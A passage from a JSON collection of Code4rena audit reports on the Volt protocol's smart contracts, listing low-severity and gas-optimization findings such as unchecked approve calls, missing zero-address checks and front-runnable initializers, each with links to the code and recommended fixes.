2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/Permissions.sol::15 => bytes32 public constant override GUARDIAN_ROLE = keccak256(\"GUARDIAN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::18 => bytes32 internal constant GOVERNOR = keccak256(\"GOVERN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::21 => bytes32 internal constant GUARDIAN = keccak256(\"GUARDIAN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::24 => bytes32 internal constant PCV_CONTROLLER = keccak256(\"PCV_CONTROLLER_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::27 => bytes32 internal constant MINTER = keccak256(\"MINTER_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::34 => bytes32 internal constant PARAMETER_ADMIN = keccak256(\"PARAMETER_ADMIN\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::37 => bytes32 internal constant ORACLE_ADMIN = keccak256(\"ORACLE_ADMIN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::41 => keccak256(\"TRIBAL_CHIEF_ADMIN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::45 => keccak256(\"PCV_GUARDIAN_ADMIN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::48 => bytes32 internal constant MINOR_ROLE_ADMIN = keccak256(\"MINOR_ROLE_ADMIN\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::51 => bytes32 internal constant FUSE_ADMIN = keccak256(\"FUSE_ADMIN\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::54 => bytes32 internal constant VETO_ADMIN = keccak256(\"VETO_ADMIN\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::57 => bytes32 internal constant MINTER_ADMIN = keccak256(\"MINTER_ADMIN\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::60 => bytes32 internal constant OPTIMISTIC_ADMIN = keccak256(\"OPTIMISTIC_ADMIN\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::67 => bytes32 internal constant LBP_SWAP_ROLE = keccak256(\"SWAP_ADMIN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::70 => bytes32 internal constant VOTIUM_ROLE = keccak256(\"VOTIUM_ADMIN_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::73 => bytes32 internal constant MINOR_PARAM_ROLE = keccak256(\"MINOR_PARAM_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::76 => bytes32 internal constant ADD_MINTER_ROLE = keccak256(\"ADD_MINTER_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/TribeRoles.sol::79 => bytes32 internal constant PSM_ADMIN_ROLE = keccak256(\"PSM_ADMIN_ROLE\");\n```\nThis results in the keccak operation being performed whenever the variable is used, increasing gas costs relative to just storing the output hash. Changing to immutable will only perform hashing on contract deployment which will save gas.\n\nSee: ethereum/solidity#9232 (https://github.com/ethereum/solidity/issues/9232#issuecomment-646131646)\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider to change the variable to be immutable rather than constant.\n\n# C4-007: ERC20 approve method missing return value check\n\n## Impact\n\nThe following contract functions performs an ERC20.approve() call but does not check the success return value. Some tokens do not revert if the approval failed but return false instead.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/pcv/compound/ERC20CompoundPCVDeposit.sol#L31\n```\n\n2. Tokens that don't actually perform the approve and return false are still counted as a correct approve.\n\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nIts recommend to using OpenZeppelin’s SafeERC20 versions with the safeApprove function that handles the return value check as well as non-standard-compliant tokens.\n\nReference : https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/119"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/pcv/PCVDeposit.sol#L30\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L206\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L293\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L242\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L280\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n\n# C4-002 : Missing zero-address check in constructors and the setter functions\n\n## Impact -  LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following all contract functions.\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L85\n\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/pcv/compound/ERC20CompoundPCVDeposit.sol#L22\n\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/pcv/compound/CompoundPCVDepositBase.sol#L31\n\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/oracle/ScalingPriceOracle.sol#L71\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n# C4-003 : transferOwnership should be two step process\n\n## Impact -  LOW\n\nThe current ownership transfer process involves the current owner calling Unlock.transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. Lack of two-step procedure for critical operations leaves them error-prone\nif the address is incorrect, the new address will take on the functionality of the new role immediately\n\nfor Ex : -Alice deploys a new version of the whitehack group address. When she invokes the whitehack group address setter to replace the address, she accidentally enters the wrong address. The new address now has access to the role immediately and is too late to revert\n\n\n## Proof of Concept\n\n1. https://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/oracle/OraclePassThrough.sol#L14.\n2. The contracts have many onlyOwner function.\n3. The contract is inherited from the Ownable which includes transferOwnership.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement zero address check and Consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n# C4-004 :  Consider making contracts Pausable\n\n## Impact -  LOW\n\nThere are many external risks so my suggestion is that you should consider making the contracts pausable, so in case of an unexpected event, the admin can pause transfers.\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider making contracts Pausable https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol.\n\n# C4-005 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L157\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L167\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/peg/NonCustodialPSM.sol#L182\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n# C4-006 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/Core.sol#L20\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n# C4-007 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/oracle/ScalingPriceOracle.sol#L218\n\n\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n# C4-008 : Upgrade Pragma To solidity 0.8.10+\n\n## Impact\n\nUsing newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.\n\n## Proof of Concept\n\nSolidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/\n\nCode Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to upgrade pragma to at least 0.8.10.",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/115"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1.  Unnecessary Zero Check \n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L292\n\n`amountFeiToTransfer` doesnt need to be checked if was zero\n\n##Tool Used\nVisual Studio Code, Manual Review\n\n##Reccomendation Mitigation\nRemove it\n\n2. Betterway to use `SafeERC20` function for gas saving\n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/pcv/PCVDeposit.sol\nthis implementation can be used for another gas opt\n\n##Impact\nExpensive gas\n\n##POC\nhttps://docs.openzeppelin.com/contracts/3.x/api/token/erc20#SafeERC20\n\n##Tool Used\nManual Review\n\n##Reccomendation Mitigation Steps\nby do not declaring `using SafeERC20 for IERC20;` and used `safeTransfer` and `safeTransferFrom`.\n\n\n3. change multiple if into `if-elseif` logic for saving more gas\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L292-L298\nThis implementation can be using for saving more gas.\n\n##Tool used\nVisual Studio Code, Manual Review\n\n##Recommended Mitigation Step\n```\n        if (amountFeiToTransfer != 0) {\n            IERC20(volt()).safeTransfer(to, amountFeiToTransfer);\n        }\n\n\n        if (amountFeiToMint != 0) {\n            rateLimitedMinter.mintVolt(to, amountFeiToMint);\n        }\n```\nchange to `else if` to save gas :\n\n```\n        if (amountFeiToTransfer != 0) {\n            IERC20(volt()).safeTransfer(to, amountFeiToTransfer);\n        } else if (amountFeiToMint != 0) {\n            rateLimitedMinter.mintVolt(to, amountFeiToMint);\n        }\n```\n\n4. Unnecessary Constructor can be removed\n\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/refs/CoreRef.sol#L27\n\nsince this was no-op, removed this can be saving more gas.\n\n##Impact \nExpensive gas\n\n##Tool used \nRemix\n\n##Recommended Mitigation\nRemove Constructor\n\n5. Public Function to External for saving gas\n\nThis functions could be set external to saving more gas gas \n\n##Impact\nExpensive Gas\n\n##POC\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/core/Permissions.sol#L187\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/core/Permissions.sol#L202\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/104"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# 1. Use calldata instead of memory for function parameters\n\n## Impact\n\nUse calldata instead of memory for function parameters. Having function arguments use calldata instead of memory can save gas.\n\n## Proof of Concept\n\nAt least two cases exist of function arguments using memory instead of calldata\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/OracleRef.sol#L84\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L456\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nChange function arguments from memory to calldata\n\n# 2. Add payable to functions that won't receive ETH\n\n## Impact\n\nMarking a function as payable saves gas. Functions that have the onlyOwner modifier cannot be called by normal users and will not mistakenly receive ETH. These functions can be payable to save gas.\n\n## Proof of Concept\n\nOne function was found with the onlyOwner modifier that can be payable\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/OraclePassThrough.sol#L53\n\nBut all functions in Permissions.sol that have the onlyGovernor modifier or the onlyGuardian modifier can receive the same gas optimization\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nAdd payable to functions with access control for gas savings\n\n# 3. Split up require statements instead of &&\n\n## Impact\n\nCombining require statement conditions with && logic uses unnecessary gas. It is better to split up each part of the logical statement into a separate require statements\n\n## Proof of Concept\n\nOne instance of this issue was found\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/volt/Volt.sol#L91\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nUse separate require statements instead of concatenating with && to save gas\n\n# 4. Short require strings save gas\n\n## Impact\n\nStrings in solidity are handled in 32 byte chunks. A require string longer than 32 bytes uses more gas. Shortening these strings will save gas.\n\n## Proof of Concept\n\nSeveral cases of this gas optimization were found. These are a few examples, but more may exist\n1. https://github.com/code-423n4/2022-03-volt/blob/main/contracts/pcv/compound/ERC20CompoundPCVDeposit.sol#L36\n2. https://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L48\n3. https://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L48\n4. https://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L56\n5. https://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L72\n6. https://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L82\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nShorten require strings\n\n# 5. Use Solidity errors instead of require\n\n## Impact\n\nSolidity errors introduced in version 0.8.4 can save gas on revert conditions\nhttps://blog.soliditylang.org/2021/04/21/custom-errors/\nhttps://twitter.com/PatrickAlphaC/status/1505197417884528640\n\n## Proof of Concept\n\nError messages are not used in the contract, so all require blocks could receive a gas optimization\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReplace require blocks with new solidity errors from solidity 0.8.4 described in https://blog.soliditylang.org/2021/04/21/custom-errors/",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/102"
    }
  },
  {
    "title": "QA Report",
    "body": "# Low 1. Deprecated `_setupRole` function used\n\n## Impact\n\nThe _setupRole function is deprecated according to the Open Zeppelin comment\n`NOTE: This function is deprecated in favor of {_grantRole}`\n\nUse the recommended _grantRole function instead.\n\n## Proof of concept\n\nThe _setupRole function, which is deprecated, is found in one place\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L212\n\nThis Open Zeppelin comment indicates it is deprecated\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/AccessControl.sol#L195\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReplace the _setupRole function with _grantRole from the same Open Zeppelin library\n\n# Low 2. Use safeIn/DecreaseAllowance instead of approve\n\n## Impact\n\nThe approve function is called for an ERC20 without checking the return value. Checking the return value would help confirm the approve was successful, but it is better to use safeIncreaseAllowance or safeDecreaseAllowance. This suggestion is mentioned in this Open Zeppelin comment\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/742e85be7c08dff21410ba4aa9c60f6a033befb8/contracts/token/ERC20/utils/SafeERC20.sol#L38-L44\n\n## Proof of concept\n\nThe unsafe approve is used in ERC20CompoundPCVDeposit\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/pcv/compound/ERC20CompoundPCVDeposit.sol#L31\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReplace the unsafe approve call with safeIncreaseAllowance or safeDecreaseAllowance\n\n# Low 3. revokeOverride backdoor elevates onlyGuardian role\n\n## Impact\n\nThe revokeOverride function acts like a backdoor to give the Guardian role the same revoke privileges as a Governor role, with the exception of preventing a guardian revoke. It would be better to create a new modifier for the relevant functions named 'onlyGovernorOrGuardian' to clarify the actual access controls, because the onlyGovernor modifier does not accurately reflect the access control of the revoke functions.\n\n## Proof of concept\n\nThe revokeOverride gives guardian users a backdoor to functions with the onlyGovernor modifier\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L127\n\nAccess controls should not be broken in this manner to give one privilege level access to functions that are limited to another privilege level. With the current code, an address might be granted the Guardian role without the understanding that this allows that address to revoke the roles of other addresses. Instead, the permissions of the onlyGovernor functions that permit the Guardian role should be modified.\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nAdd a new modifier named 'onlyGovernorOrGuardian' that permits both Governor and Guardian users. Use this modifier on all relevant revoke functions. A similar modifier is already created in CoreRef.\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L69\n```\nmodifier onlyGovernorOrGuardian() {\n    require(\n        isGovernor(msg.sender) || isGuardian(msg.sender),\n        \"Permissions: Caller is not a governor or guardian\"\n    );\n    _;\n}\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/101"
    }
  },
  {
    "title": "QA Report",
    "body": "* No need for assembly, you can get chain id from block.chainid;\n```solidity\n       // solhint-disable-next-line no-inline-assembly\n        assembly {\n            chainId := chainid()\n        }\n```\n\n* Here I think the _to parameter needs to be an empty address 0x0:\n```solidity\n    emit Burning(msg.sender, msg.sender, amount);\n```\n```solidity\n    event Burning(\n        address indexed _to,\n        address indexed _burner,\n        uint256 _amount\n    );\n```\n\n* DOMAIN_SEPARATOR may change in case of a hardfork, so it is advised to re-calculate it.\n\n* Consider making Volt token contract inherit from OZ's ERC20Permit, so you do not have to worry about it in your contract:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\n\n* Would be safer to use SafeCast's toInt256 here:\n```solidity\n  int256 _decimalsNormalizer = feiDecimals -\n      int256(uint256(IERC20Metadata(token).decimals()));\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/97"
    }
  },
  {
    "title": "QA Report",
    "body": "1. Zero address check \nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L105\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/ScalingPriceOracle.sol#L88\n2. Unhandled output \nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/pcv/compound/ERC20CompoundPCVDeposit.sol#L31\n3. It's better to convert previousMonth to int256, it contains implicit conversion to int256 from int 128\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/ScalingPriceOracle.sol#L124\n4. Misleading comment, it's time from `initTimed` not contract initialization\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/Timed.sol#L49\n5. Need to always check LINK balance of oracle, when balance < fee oracle can't make update CPI request\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/ScalingPriceOracle.sol#L150\n6. If currentMonth in init is 0, then CPI update will revert, zero div\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/ScalingPriceOracle.sol#L92\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/ScalingPriceOracle.sol#L174\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/Deviation.sol#L23",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/86"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Immutable instead of constant \nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L49\n2. reason string with length > 32 bytes takes more gas, it increases deployed bytecode size\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L277\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L402\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/peg/NonCustodialPSM.sol#L445\n3. Should be immutable \nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/volt/Volt.sol#L11\nhttps://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/pcv/compound/ERC20CompoundPCVDeposit.sol#L16\n4. Can be in single slot, timestamp and duration fit in 128 bits\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/Timed.sol#L8-L11",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/85"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "\nError messages longer than 32 bytes\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L48\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L56\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L64\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L72\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L82\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/pcv/compound/ERC20CompoundPCVDeposit.sol#L36\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L58\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L68\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L85\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L107\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L146\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L150\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L155\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L268\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L272\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L299\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L303\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L307\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L337\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L117\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L123\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L239\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L277\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L402\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L415\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L428\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L441\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L445\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L31\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L39\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Permissions.sol#L31\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L48\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L64\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L103\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/ScalingPriceOracle.sol#L141\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/oracle/ScalingPriceOracle.sol#L177\n\n## Vulnerability details\n\n## Impact\nError strings longer than 32 bytes are more expensive.\n\n## Proof of Concept\nhttps://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#c17b\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nLimit the error strings to 32 bytes max.\n\n\n\nOperations can be made unchecked\n\n## Lines of code\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L340\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L106\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/Timed.sol#L57\n\n## Vulnerability details\n\n## Impact\nThese operations can not underflow, 